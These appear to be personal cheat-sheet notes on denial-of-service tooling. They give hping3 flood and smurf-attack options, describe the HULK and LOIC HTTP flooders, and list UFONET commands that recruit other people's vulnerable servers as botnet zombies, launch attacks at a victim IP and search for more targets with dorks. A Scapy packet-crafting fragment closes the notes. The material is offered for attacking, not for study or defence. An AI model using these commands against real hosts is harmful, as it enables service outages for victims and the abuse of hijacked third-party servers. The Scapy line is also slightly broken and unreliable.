### hping3
- can also be used for scanning ports.
- useful options: `--flood` `--rand-source` `-p ++80`
- for smurf attack use `-S host_ip broadcast_range_mask`. 
### HTTP flooad attacks
- HULK
- LOIC: for more longer connections but also the rate of them is less than HULK. It actually waits some seconds for established connections and then send new requests.
### DDOS (botnet)
- UFONET
- you can use vulnerable servers as your zombies of net. first download them `--download-zombies`. and then verify them by `-t botnets/zombies.txt`
- `-i victim` to found the largest resource of it
- ```bash ufonet -a victim_ip -r 10 -b victim_ip/resource_path```
  - `-b` means the concurrent connections of each bot
- `./ufonet -s 'proxy.php?url=' --sa` : search all webservers through all search engines that contains specific strings. then you can check dork strings inside `botnets/dorsl.txt`.
### SCAPY
  ```python
  p=Ether()/IP(src='',dst='')/RAW("x"*20)
  ```
